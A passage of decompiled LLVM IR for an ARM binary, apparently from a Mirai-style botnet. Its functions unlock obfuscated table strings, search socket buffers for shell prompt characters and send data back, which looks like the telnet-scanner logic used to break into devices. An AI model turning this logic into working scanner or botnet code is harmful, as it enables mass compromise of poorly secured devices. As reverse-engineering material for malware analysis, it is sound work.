  %v2_f340 = inttoptr i32 %v1_f340 to i8*
  %v3_f340 = load i8, i8* %v2_f340, align 1
  %v4_f340 = zext i8 %v3_f340 to i32
  store i32 %v4_f340, i32* %r2.global-to-local, align 4
  %v2_f344 = icmp ugt i8 %v3_f340, 61
  store i1 %v2_f344, i1* %cpsr_c.global-to-local, align 1
  %v7_f344 = icmp eq i8 %v3_f340, 62
  store i1 %v7_f344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f344, label %dec_label_pc_f5d4, label %bb446

bb446:                                            ; preds = %dec_label_pc_f340
  %v3_f348 = icmp ugt i8 %v3_f340, 57
  store i1 %v3_f348, i1* %cpsr_c.global-to-local, align 1
  %v8_f348 = icmp eq i8 %v3_f340, 58
  store i1 %v8_f348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f348, label %dec_label_pc_f5d4, label %dec_label_pc_f350

dec_label_pc_f350:                                ; preds = %bb446
  %v2_f350 = icmp ugt i8 %v3_f340, 35
  store i1 %v2_f350, i1* %cpsr_c.global-to-local, align 1
  %v7_f350 = icmp eq i8 %v3_f340, 36
  store i1 %v7_f350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f350, label %dec_label_pc_f5d4, label %dec_label_pc_f358

dec_label_pc_f358:                                ; preds = %dec_label_pc_f350
  %v2_f358 = icmp ugt i8 %v3_f340, 34
  store i1 %v2_f358, i1* %cpsr_c.global-to-local, align 1
  %v7_f358 = icmp eq i8 %v3_f340, 35
  store i1 %v7_f358, i1* %cpsr_z.global-to-local, align 1
  %v1_f35c = add i32 %v0_f35c, -1
  store i32 %v1_f35c, i32* %r3.global-to-local, align 4
  br i1 %v7_f358, label %dec_label_pc_f5d4, label %dec_label_pc_f364

dec_label_pc_f364:                                ; preds = %dec_label_pc_f364.preheader, %dec_label_pc_f358
  %v0_f35c = phi i32 [ %v2_f334, %dec_label_pc_f364.preheader ], [ %v1_f35c, %dec_label_pc_f358 ]
  %v0_f364 = phi i32 [ %v1_f304, %dec_label_pc_f364.preheader ], [ %v1_f364, %dec_label_pc_f358 ]
  %v1_f364 = add i32 %v0_f364, -1
  store i32 %v1_f364, i32* %r1.global-to-local, align 4
  %v2_f364 = icmp ne i32 %v0_f364, 0
  store i1 %v2_f364, i1* %cpsr_c.global-to-local, align 1
  %v7_f364 = icmp eq i32 %v0_f364, 1
  store i1 %v7_f364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f364, label %dec_label_pc_f36c, label %dec_label_pc_f340

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f364, %dec_label_pc_f300
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f370 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_f380 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  %v3_f384 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f380, i32* %r2.global-to-local, align 4
  %v1_f38c = add i32 %v3_f384, -1
  store i32 %v1_f38c, i32* %r3.global-to-local, align 4
  %v0_f390 = load i32, i32* @sb, align 4
  store i32 %v0_f390, i32* %r0.global-to-local, align 4
  %v0_f394 = load i32, i32* @r6, align 4
  %v1_f394 = add i32 %v0_f394, 24
  %v2_f394 = inttoptr i32 %v1_f394 to i32*
  %v3_f394 = load i32, i32* %v2_f394, align 4
  store i32 %v3_f394, i32* %r1.global-to-local, align 4
  %v4_f398 = call i32 @util_memsearch(i32 %v0_f390, i32 %v3_f394, i32 %v3_f380, i32 %v1_f38c)
  store i32 %v4_f398, i32* %r0.global-to-local, align 4
  %v1_f39c = add i32 %v4_f398, 1
  store i32 %v1_f39c, i32* @r7, align 4
  %v2_f39c = icmp eq i32 %v4_f398, -1
  store i1 %v2_f39c, i1* %cpsr_c.global-to-local, align 1
  %v7_f39c = icmp eq i32 %v1_f39c, 0
  store i1 %v7_f39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f39c, label %thread-pre-split124, label %bb447

bb447:                                            ; preds = %dec_label_pc_f36c
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split124

thread-pre-split124:                              ; preds = %dec_label_pc_f36c, %bb447
  %v0_f3a4 = phi i1 [ false, %bb447 ], [ true, %dec_label_pc_f36c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_f3a4, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f7f0 = call i32 @table_lock_val(i32 25)
  br i1 %v0_f3a4, label %dec_label_pc_f7ec, label %dec_label_pc_f3b4

dec_label_pc_f3b4:                                ; preds = %thread-pre-split124, %dec_label_pc_f5d4
  %storemerge = phi i32 [ %v1_f5dc, %dec_label_pc_f5d4 ], [ %v1_f7f0, %thread-pre-split124 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_f3b4 = load i32, i32* @r6, align 4
  %v1_f3b4 = inttoptr i32 %v0_f3b4 to i32*
  %v2_f3b4 = load i32, i32* %v1_f3b4, align 4
  store i32 %v2_f3b4, i32* %r3.global-to-local, align 4
  %v1_f3b8 = add i32 %v0_f3b4, 4
  %v2_f3b8 = inttoptr i32 %v1_f3b8 to i32*
  %v3_f3b8 = load i32, i32* %v2_f3b8, align 4
  store i32 %v3_f3b8, i32* %r0.global-to-local, align 4
  %v1_f3bc = add i32 %v2_f3b4, 13
  %v2_f3bc = inttoptr i32 %v1_f3bc to i8*
  %v3_f3bc = load i8, i8* %v2_f3bc, align 1
  %v4_f3bc = zext i8 %v3_f3bc to i32
  store i32 %v4_f3bc, i32* %r2.global-to-local, align 4
  %v1_f3c0 = add i32 %v2_f3b4, 4
  %v2_f3c0 = inttoptr i32 %v1_f3c0 to i32*
  %v3_f3c0 = load i32, i32* %v2_f3c0, align 4
  store i32 %v3_f3c0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f3c8 = call i32 @__libc_send(i32 %v3_f3b8, i32 %v3_f3c0, i32 %v4_f3bc, i32 16384)
  store i32 %v4_f3c8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f3d0 = load i32, i32* @r6, align 4
  %v1_f3d0 = add i32 %v0_f3d0, 4
  %v2_f3d0 = inttoptr i32 %v1_f3d0 to i32*
  %v3_f3d0 = load i32, i32* %v2_f3d0, align 4
  store i32 %v3_f3d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f3dc = call i32 @__libc_send(i32 %v3_f3d0, i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32 2, i32 16384)
  store i32 %v4_f3dc, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_f3e4 = load i32, i32* @r6, align 4
  %v2_f3e4 = add i32 %v1_f3e4, 12
  %v3_f3e4 = inttoptr i32 %v2_f3e4 to i32*
  store i32 5, i32* %v3_f3e4, align 4
  br label %dec_label_pc_f3e8

dec_label_pc_f3e8:                                ; preds = %dec_label_pc_effc, %bb434, %dec_label_pc_f4f8, %dec_label_pc_f630, %dec_label_pc_f59c, %dec_label_pc_f674, %dec_label_pc_f3b4
  %v0_f3e8 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3e8 = icmp eq i32 %v0_f3e8, 0
  store i1 %v2_f3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3e8, label %dec_label_pc_ebd0.loopexit, label %dec_label_pc_ed6c

dec_label_pc_f3f4:                                ; preds = %dec_label_pc_ec50
  %v1_f3f4 = add i32 %v0_ec50, 24
  %v2_f3f4 = inttoptr i32 %v1_f3f4 to i32*
  %v3_f3f4 = load i32, i32* %v2_f3f4, align 4
  store i32 %v3_f3f4, i32* %r2.global-to-local, align 4
  %v1_f3f8 = add i32 %v3_f3f4, -1
  store i32 %v1_f3f8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3fc = icmp eq i32 %v1_f3f8, 0
  store i1 %v2_f3fc, i1* %cpsr_z.global-to-local, align 1
  %tmp448 = icmp slt i32 %v1_f3f8, 1
  br i1 %tmp448, label %dec_label_pc_f470, label %dec_label_pc_f404

dec_label_pc_f404:                                ; preds = %dec_label_pc_f3f4
  %v2_f404 = add i32 %v1_f3f8, %v0_ec50
  store i32 %v2_f404, i32* %r3.global-to-local, align 4
  %v1_f408 = add i32 %v2_f404, 28
  %v2_f408 = inttoptr i32 %v1_f408 to i8*
  %v3_f408 = load i8, i8* %v2_f408, align 1
  %v4_f408 = zext i8 %v3_f408 to i32
  store i32 %v4_f408, i32* %r3.global-to-local, align 4
  %v2_f40c = icmp ugt i8 %v3_f408, 61
  store i1 %v2_f40c, i1* %cpsr_c.global-to-local, align 1
  %v7_f40c = icmp eq i8 %v3_f408, 62
  store i1 %v7_f40c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f40c, label %dec_label_pc_f588, label %bb449

bb449:                                            ; preds = %dec_label_pc_f404
  %v3_f410 = icmp ugt i8 %v3_f408, 57
  store i1 %v3_f410, i1* %cpsr_c.global-to-local, align 1
  %v8_f410 = icmp eq i8 %v3_f408, 58
  store i1 %v8_f410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f410, label %dec_label_pc_f588, label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %bb449
  %v2_f418 = icmp ugt i8 %v3_f408, 35
  store i1 %v2_f418, i1* %cpsr_c.global-to-local, align 1
  %v7_f418 = icmp eq i8 %v3_f408, 36
  store i1 %v7_f418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f418, label %dec_label_pc_f588, label %dec_label_pc_f420

dec_label_pc_f420:                                ; preds = %dec_label_pc_f418
  %v2_f420 = icmp ugt i8 %v3_f408, 34
  store i1 %v2_f420, i1* %cpsr_c.global-to-local, align 1
  %v7_f420 = icmp eq i8 %v3_f408, 35
  store i1 %v7_f420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f420, label %dec_label_pc_f588, label %dec_label_pc_f428

dec_label_pc_f428:                                ; preds = %dec_label_pc_f420
  %v2_f428 = icmp ugt i8 %v3_f408, 36
  store i1 %v2_f428, i1* %cpsr_c.global-to-local, align 1
  %v7_f428 = icmp eq i8 %v3_f408, 37
  store i1 %v7_f428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f428, label %dec_label_pc_f588, label %dec_label_pc_f468.preheader

dec_label_pc_f468.preheader:                      ; preds = %dec_label_pc_f428
  %v3_f42c = add i32 %v0_ec50, 28
  %v2_f430 = add i32 %v3_f42c, %v3_f3f4
  store i32 %v2_f430, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f468

dec_label_pc_f43c:                                ; preds = %dec_label_pc_f468
  %v1_f43c = add i32 %v0_f460, -2
  %v2_f43c = inttoptr i32 %v1_f43c to i8*
  %v3_f43c = load i8, i8* %v2_f43c, align 1
  %v4_f43c = zext i8 %v3_f43c to i32
  store i32 %v4_f43c, i32* %r2.global-to-local, align 4
  %v2_f440 = icmp ugt i8 %v3_f43c, 61
  store i1 %v2_f440, i1* %cpsr_c.global-to-local, align 1
  %v7_f440 = icmp eq i8 %v3_f43c, 62
  store i1 %v7_f440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f440, label %dec_label_pc_f588, label %bb450

bb450:                                            ; preds = %dec_label_pc_f43c
  %v3_f444 = icmp ugt i8 %v3_f43c, 57
  store i1 %v3_f444, i1* %cpsr_c.global-to-local, align 1
  %v8_f444 = icmp eq i8 %v3_f43c, 58
  store i1 %v8_f444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f444, label %dec_label_pc_f588, label %dec_label_pc_f44c

dec_label_pc_f44c:                                ; preds = %bb450
  %v2_f44c = icmp ugt i8 %v3_f43c, 35
  store i1 %v2_f44c, i1* %cpsr_c.global-to-local, align 1
  %v7_f44c = icmp eq i8 %v3_f43c, 36
  store i1 %v7_f44c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f44c, label %dec_label_pc_f588, label %dec_label_pc_f454

dec_label_pc_f454:                                ; preds = %dec_label_pc_f44c
  %v2_f454 = icmp ugt i8 %v3_f43c, 34
  store i1 %v2_f454, i1* %cpsr_c.global-to-local, align 1
  %v7_f454 = icmp eq i8 %v3_f43c, 35
  store i1 %v7_f454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f454, label %dec_label_pc_f588, label %dec_label_pc_f45c

dec_label_pc_f45c:                                ; preds = %dec_label_pc_f454
  %v2_f45c = icmp ugt i8 %v3_f43c, 36
  store i1 %v2_f45c, i1* %cpsr_c.global-to-local, align 1
  %v7_f45c = icmp eq i8 %v3_f43c, 37
  store i1 %v7_f45c, i1* %cpsr_z.global-to-local, align 1
  %v1_f460 = add i32 %v0_f460, -1
  store i32 %v1_f460, i32* %r3.global-to-local, align 4
  br i1 %v7_f45c, label %dec_label_pc_f588, label %dec_label_pc_f468

dec_label_pc_f468:                                ; preds = %dec_label_pc_f468.preheader, %dec_label_pc_f45c
  %v0_f460 = phi i32 [ %v2_f430, %dec_label_pc_f468.preheader ], [ %v1_f460, %dec_label_pc_f45c ]
  %v0_f468 = phi i32 [ %v1_f3f8, %dec_label_pc_f468.preheader ], [ %v1_f468, %dec_label_pc_f45c ]
  %v1_f468 = add i32 %v0_f468, -1
  store i32 %v1_f468, i32* %r1.global-to-local, align 4
  %v2_f468 = icmp ne i32 %v0_f468, 0
  store i1 %v2_f468, i1* %cpsr_c.global-to-local, align 1
  %v7_f468 = icmp eq i32 %v0_f468, 1
  store i1 %v7_f468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f468, label %dec_label_pc_f470, label %dec_label_pc_f43c

dec_label_pc_f470:                                ; preds = %dec_label_pc_f468, %dec_label_pc_f3f4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f474 = call i32 @table_unlock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f47c = call i32 @table_unlock_val(i32 27)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_f48c = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_f48c, i32* @r4, align 4
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_f4a0 = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  %v3_f4a4 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_f4a0, 16777216
  %v1_f4a8 = sdiv i32 %sext, 16777216
  store i32 %v1_f4a8, i32* @r5, align 4
  %v0_f4ac = load i32, i32* @r4, align 4
  store i32 %v0_f4ac, i32* %r2.global-to-local, align 4
  %v1_f4b0 = add i32 %v3_f4a4, -1
  store i32 %v1_f4b0, i32* %r3.global-to-local, align 4
  %v0_f4b4 = load i32, i32* @sb, align 4
  store i32 %v0_f4b4, i32* %r0.global-to-local, align 4
  %v0_f4b8 = load i32, i32* @r6, align 4
  %v1_f4b8 = add i32 %v0_f4b8, 24
  %v2_f4b8 = inttoptr i32 %v1_f4b8 to i32*
  %v3_f4b8 = load i32, i32* %v2_f4b8, align 4
  store i32 %v3_f4b8, i32* %r1.global-to-local, align 4
  %v4_f4bc = call i32 @util_memsearch(i32 %v0_f4b4, i32 %v3_f4b8, i32 %v0_f4ac, i32 %v1_f4b0)
  store i32 %v4_f4bc, i32* %r0.global-to-local, align 4
  %v2_f4c0 = icmp eq i32 %v4_f4bc, -1
  store i1 %v2_f4c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4c0 = icmp eq i32 %v4_f4bc, -1
  store i1 %v7_f4c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4c0, label %dec_label_pc_f4d0, label %dec_label_pc_f4f8

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f470
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f4d0 = load i32, i32* %stack_var_-60, align 4
  %v0_f4d4 = load i32, i32* @r5, align 4
  store i32 %v0_f4d4, i32* %r2.global-to-local, align 4
  %v1_f4d8 = add i32 %v3_f4d0, -1
  store i32 %v1_f4d8, i32* %r3.global-to-local, align 4
  %v0_f4dc = load i32, i32* @sb, align 4
  store i32 %v0_f4dc, i32* %r0.global-to-local, align 4
  %v0_f4e0 = load i32, i32* @r6, align 4
  %v1_f4e0 = add i32 %v0_f4e0, 24
  %v2_f4e0 = inttoptr i32 %v1_f4e0 to i32*
  %v3_f4e0 = load i32, i32* %v2_f4e0, align 4
  store i32 %v3_f4e0, i32* %r1.global-to-local, align 4
  %v4_f4e4 = call i32 @util_memsearch(i32 %v0_f4dc, i32 %v3_f4e0, i32 %v0_f4d4, i32 %v1_f4d8)
  store i32 %v4_f4e4, i32* %r0.global-to-local, align 4
  %v1_f4e8 = add i32 %v4_f4e4, 1
  store i32 %v1_f4e8, i32* @r7, align 4
  %v2_f4e8 = icmp eq i32 %v4_f4e4, -1
  store i1 %v2_f4e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4e8 = icmp eq i32 %v1_f4e8, 0
  store i1 %v7_f4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4e8, label %dec_label_pc_f7ac, label %dec_label_pc_f4f8

dec_label_pc_f4f8:                                ; preds = %dec_label_pc_f4d0, %dec_label_pc_f470
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f4fc = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f504 = call i32 @table_lock_val(i32 27)
  store i32 %v1_f504, i32* %r0.global-to-local, align 4
  %v0_f508 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f508 = icmp eq i32 %v0_f508, 0
  store i1 %v2_f508, i1* %cpsr_z.global-to-local, align 1
  %tmp451 = icmp slt i32 %v0_f508, 1
  br i1 %tmp451, label %dec_label_pc_f3e8, label %dec_label_pc_f59c

dec_label_pc_f514:                                ; preds = %dec_label_pc_ef80
  store i32 %v2_f518, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_18e1c.201 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_f518, i32* @r0, align 4
  store i32 %v2_f52c, i32* @sl, align 4
  %v0_f530 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_f52c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18e13.203 to i32), i32* @r1, align 4
  %v0_f540 = call i32 @memcpy()
  store i32 %v0_f540, i32* %r0.global-to-local, align 4
  %v0_f544 = load i32, i32* @r6, align 4
  %v1_f544 = add i32 %v0_f544, 24
  %v2_f544 = inttoptr i32 %v1_f544 to i32*
  %v3_f544 = load i32, i32* %v2_f544, align 4
  %v0_f548 = load i32, i32* @r4, align 4
  %v1_f548 = add i32 %v0_f548, 2
  store i32 %v1_f548, i32* %r2.global-to-local, align 4
  %v0_f54c = load i32, i32* @sb, align 4
  %v2_f54c = add i32 %v0_f54c, %v3_f544
  store i32 %v2_f54c, i32* @r3, align 4
  %v3_f550 = icmp uge i32 %v2_f54c, %v1_f548
  store i1 %v3_f550, i1* %cpsr_c.global-to-local, align 1
  %v9_f550 = icmp eq i32 %v2_f54c, %v1_f548
  store i1 %v9_f550, i1* %cpsr_z.global-to-local, align 1
  %v2_f554 = xor i1 %v3_f550, true
  %v3_f554 = or i1 %v9_f550, %v2_f554
  br i1 %v3_f554, label %dec_label_pc_f514.dec_label_pc_effc.loopexit_crit_edge, label %dec_label_pc_f558

dec_label_pc_f514.dec_label_pc_effc.loopexit_crit_edge: ; preds = %dec_label_pc_f514
  %v0_effc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_effc

dec_label_pc_f558:                                ; preds = %dec_label_pc_f514
  %v2_f558 = inttoptr i32 %v1_f548 to i8*
  %v3_f558 = load i8, i8* %v2_f558, align 1
  %v4_f558 = zext i8 %v3_f558 to i32
  store i32 %v4_f558, i32* %r3.global-to-local, align 4
  %v2_f55c = icmp ugt i8 %v3_f558, 30
  store i1 %v2_f55c, i1* %cpsr_c.global-to-local, align 1
  %v7_f55c = icmp eq i8 %v3_f558, 31
  store i1 %v7_f55c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f55c, label %dec_label_pc_f68c, label %dec_label_pc_f564

dec_label_pc_f564:                                ; preds = %dec_label_pc_f558
  %v1_f564 = inttoptr i32 %v0_f548 to i8*
  %v2_f564 = load i8, i8* %v1_f564, align 1
  %v3_f564 = zext i8 %v2_f564 to i32
  store i32 %v3_f564, i32* %r3.global-to-local, align 4
  %v2_f568 = icmp ugt i8 %v2_f564, -4
  store i1 %v2_f568, i1* %cpsr_c.global-to-local, align 1
  %v7_f568 = icmp eq i8 %v2_f564, -3
  store i1 %v7_f568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f568, label %.thread138, label %dec_label_pc_f578

.thread138:                                       ; preds = %dec_label_pc_f564
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f564, align 1
  %v0_f574.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f574.pr.pr, label %dec_label_pc_ef94, label %.thread138.dec_label_pc_f578thread-pre-split_crit_edge

.thread138.dec_label_pc_f578thread-pre-split_crit_edge: ; preds = %.thread138
  %v0_f578.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f578

dec_label_pc_f578:                                ; preds = %dec_label_pc_f564, %.thread138.dec_label_pc_f578thread-pre-split_crit_edge
  %v0_f578.pr = phi i32 [ %v0_f578.pr.pre, %.thread138.dec_label_pc_f578thread-pre-split_crit_edge ], [ %v3_f564, %dec_label_pc_f564 ]
  %v2_f578 = icmp ugt i32 %v0_f578.pr, 250
  store i1 %v2_f578, i1* %cpsr_c.global-to-local, align 1
  %v7_f578 = icmp eq i32 %v0_f578.pr, 251
  store i1 %v7_f578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f578, label %bb452, label %dec_label_pc_ef94

bb452:                                            ; preds = %dec_label_pc_f578
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f580 = load i32, i32* @r4, align 4
  %v4_f580 = inttoptr i32 %v3_f580 to i8*
  store i8 -3, i8* %v4_f580, align 1
  br label %dec_label_pc_ef94

dec_label_pc_f588:                                ; preds = %dec_label_pc_f43c, %dec_label_pc_f45c, %dec_label_pc_f454, %dec_label_pc_f44c, %bb450, %dec_label_pc_f428, %dec_label_pc_f404, %dec_label_pc_f420, %dec_label_pc_f418, %bb449
  %v0_f58c = phi i32 [ %v1_f3f8, %dec_label_pc_f428 ], [ %v1_f3f8, %dec_label_pc_f404 ], [ %v1_f3f8, %dec_label_pc_f420 ], [ %v1_f3f8, %dec_label_pc_f418 ], [ %v1_f3f8, %bb449 ], [ %v1_f468, %bb450 ], [ %v1_f468, %dec_label_pc_f44c ], [ %v1_f468, %dec_label_pc_f454 ], [ %v1_f468, %dec_label_pc_f45c ], [ %v1_f468, %dec_label_pc_f43c ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f58c = add i32 %v0_f58c, 1
  store i32 %v1_f58c, i32* @r7, align 4
  %v1_f590 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f598 = call i32 @table_lock_val(i32 27)
  store i32 %v1_f598, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f59c

dec_label_pc_f59c:                                ; preds = %dec_label_pc_f4f8, %dec_label_pc_f588
  %v0_f59c = load i32, i32* @r6, align 4
  %v1_f59c = inttoptr i32 %v0_f59c to i32*
  %v2_f59c = load i32, i32* %v1_f59c, align 4
  store i32 %v2_f59c, i32* %r3.global-to-local, align 4
  %v1_f5a0 = add i32 %v0_f59c, 4
  %v2_f5a0 = inttoptr i32 %v1_f5a0 to i32*
  %v3_f5a0 = load i32, i32* %v2_f5a0, align 4
  store i32 %v3_f5a0, i32* %r0.global-to-local, align 4
  %v1_f5a4 = add i32 %v2_f59c, 12
  %v2_f5a4 = inttoptr i32 %v1_f5a4 to i8*
  %v3_f5a4 = load i8, i8* %v2_f5a4, align 1
  %v4_f5a4 = zext i8 %v3_f5a4 to i32
  store i32 %v4_f5a4, i32* %r2.global-to-local, align 4
  %v1_f5a8 = inttoptr i32 %v2_f59c to i32*
  %v2_f5a8 = load i32, i32* %v1_f5a8, align 4
  store i32 %v2_f5a8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f5b0 = call i32 @__libc_send(i32 %v3_f5a0, i32 %v2_f5a8, i32 %v4_f5a4, i32 16384)
  store i32 %v4_f5b0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f5b8 = load i32, i32* @r6, align 4
  %v1_f5b8 = add i32 %v0_f5b8, 4
  %v2_f5b8 = inttoptr i32 %v1_f5b8 to i32*
  %v3_f5b8 = load i32, i32* %v2_f5b8, align 4
  store i32 %v3_f5b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f5c4 = call i32 @__libc_send(i32 %v3_f5b8, i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), i32 2, i32 16384)
  store i32 %v4_f5c4, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_f5cc = load i32, i32* @r6, align 4
  %v2_f5cc = add i32 %v1_f5cc, 12
  %v3_f5cc = inttoptr i32 %v2_f5cc to i32*
  store i32 4, i32* %v3_f5cc, align 4
  br label %dec_label_pc_f3e8

dec_label_pc_f5d4:                                ; preds = %dec_label_pc_f340, %dec_label_pc_f358, %dec_label_pc_f350, %bb446, %dec_label_pc_f32c, %dec_label_pc_f310, %dec_label_pc_f324, %bb445
  %v0_f5d8 = phi i32 [ %v1_f304, %dec_label_pc_f32c ], [ %v1_f304, %dec_label_pc_f310 ], [ %v1_f304, %dec_label_pc_f324 ], [ %v1_f304, %bb445 ], [ %v1_f364, %bb446 ], [ %v1_f364, %dec_label_pc_f350 ], [ %v1_f364, %dec_label_pc_f358 ], [ %v1_f364, %dec_label_pc_f340 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f5d8 = add i32 %v0_f5d8, 1
  store i32 %v1_f5d8, i32* @r7, align 4
  %v1_f5dc = call i32 @table_lock_val(i32 25)
  br label %dec_label_pc_f3b4

dec_label_pc_f5e4:                                ; preds = %dec_label_pc_ecf0
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f5f0 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_f484, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f600 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f600, i32* %r0.global-to-local, align 4
  %v3_f604 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f600, i32* %r2.global-to-local, align 4
  %v1_f60c = add i32 %v3_f604, -1
  store i32 %v1_f60c, i32* %r3.global-to-local, align 4
  %v0_f610 = load i32, i32* @r6, align 4
  %v1_f610 = add i32 %v0_f610, 24
  %v2_f610 = inttoptr i32 %v1_f610 to i32*
  %v3_f610 = load i32, i32* %v2_f610, align 4
  store i32 %v3_f610, i32* %r1.global-to-local, align 4
  %v0_f614 = load i32, i32* @sb, align 4
  store i32 %v0_f614, i32* %r0.global-to-local, align 4
  %v4_f618 = call i32 @util_memsearch(i32 %v0_f614, i32 %v3_f610, i32 %v3_f600, i32 %v1_f60c)
  store i32 %v4_f618, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f624 = call i32 @table_lock_val(i32 9)
  store i32 %v1_f624, i32* %r0.global-to-local, align 4
  %v0_f628 = load i32, i32* @r7, align 4
  %v2_f628 = icmp eq i32 %v0_f628, -1
  store i1 %v2_f628, i1* %cpsr_c.global-to-local, align 1
  %v7_f628 = icmp eq i32 %v0_f628, -1
  store i1 %v7_f628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f628, label %dec_label_pc_ebd0.loopexit, label %dec_label_pc_f630

dec_label_pc_f630:                                ; preds = %dec_label_pc_f5e4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f630 = icmp eq i32 %v0_f628, 0
  store i1 %v2_f630, i1* %cpsr_z.global-to-local, align 1
  %tmp453 = icmp slt i32 %v0_f628, 1
  br i1 %tmp453, label %dec_label_pc_f3e8, label %dec_label_pc_f638

dec_label_pc_f638:                                ; preds = %dec_label_pc_f630
  %v0_f638 = load i32, i32* @r6, align 4
  %v1_f638 = add i32 %v0_f638, 20
  %v2_f638 = inttoptr i32 %v1_f638 to i16*
  %v3_f638 = load i16, i16* %v2_f638, align 2
  %v4_f638 = zext i16 %v3_f638 to i32
  store i32 %v4_f638, i32* %r3.global-to-local, align 4
  %v1_f63c = add i32 %v0_f638, 16
  %v2_f63c = inttoptr i32 %v1_f63c to i32*
  %v3_f63c = load i32, i32* %v2_f63c, align 4
  store i32 %v3_f63c, i32* %r2.global-to-local, align 4
